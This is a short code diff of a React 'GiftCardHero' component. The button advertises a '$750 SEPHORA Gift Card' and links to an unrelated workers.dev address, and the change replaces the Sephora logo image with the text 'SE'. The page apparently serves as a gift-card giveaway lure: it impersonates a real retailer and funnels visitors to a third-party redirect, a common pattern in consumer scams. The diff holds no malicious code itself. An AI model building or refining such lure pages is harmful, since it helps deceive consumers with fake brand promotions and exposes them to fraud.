@@ -61,12 +61,8 @@ const GiftCardHero = () => {
               href="https://girls-go.cacatmilfa.workers.dev/btn1"
               className="w-full max-w-md mx-auto bg-gradient-to-r from-pink-400 to-pink-500 hover:from-pink-500 hover:to-pink-600 text-white font-bold rounded-full shadow-xl hover:shadow-2xl py-4 px-8 text-base sm:text-lg flex items-center justify-center gap-3 animate-shein-breath"
             >
-              <div className="w-10 h-10 bg-white rounded-full flex items-center justify-center overflow-hidden shadow">
-                <img
-                  src="/sephora-logo.png"
-                  alt="Sephora Logo"
-                  className="w-8 h-8 object-contain"
-                />
+              <div className="w-10 h-10 bg-white rounded-full flex items-center justify-center shadow">
+                <span className="text-black font-bold text-xs">SE</span>
               </div>
               <div className="text-left">
                 <div className="font-bold">$750 SEPHORA Gift Card</div>
